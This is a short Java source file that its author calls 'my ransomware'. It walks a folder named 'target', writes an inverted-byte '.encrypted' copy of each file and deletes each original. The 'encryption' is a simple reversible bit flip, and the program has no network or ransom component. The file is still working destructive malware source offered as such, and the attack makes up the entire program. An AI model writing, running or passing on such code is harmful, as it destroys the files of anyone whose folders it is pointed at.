import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.FileVisitResult;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.SimpleFileVisitor;
import java.nio.file.attribute.BasicFileAttributes;

public class App {  // This is my ransomware
    public static void main(String[] args) throws IOException {
        // Malwares = {Ransomware, Adware, Spyware, Virus, Trojan}
        Path targetFolder = Paths.get("target");
        Files.walkFileTree(targetFolder, new MyEncryptFileVisitor());
    }
}

class MyEncryptFileVisitor extends SimpleFileVisitor<Path> {

    @Override
    public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {
        encryptFile(file);
        return FileVisitResult.CONTINUE;
    }

    private void encryptFile(Path file) throws IOException{
        FileInputStream fis = new FileInputStream(file.toAbsolutePath().toString());

        File encyrptedFile = new File(file.toAbsolutePath() + ".encrypted");
        encyrptedFile.createNewFile();
        FileOutputStream fos = new FileOutputStream(encyrptedFile);
        
        try{
            int read = -1;
            byte[] buffer = new byte[1024 * 2];
            while ((read = fis.read(buffer)) != -1) {
                // Encryption (Fliping Bytes)
                for (int i = 0; i < read; i++) {
                    buffer[i] = (byte) ~buffer[i];
                }
                fos.write(buffer, 0, read);
            }
        }finally{
            fis.close();
            fos.close();
            Files.delete(file);
            System.out.println(encyrptedFile);
        }
    }
    
}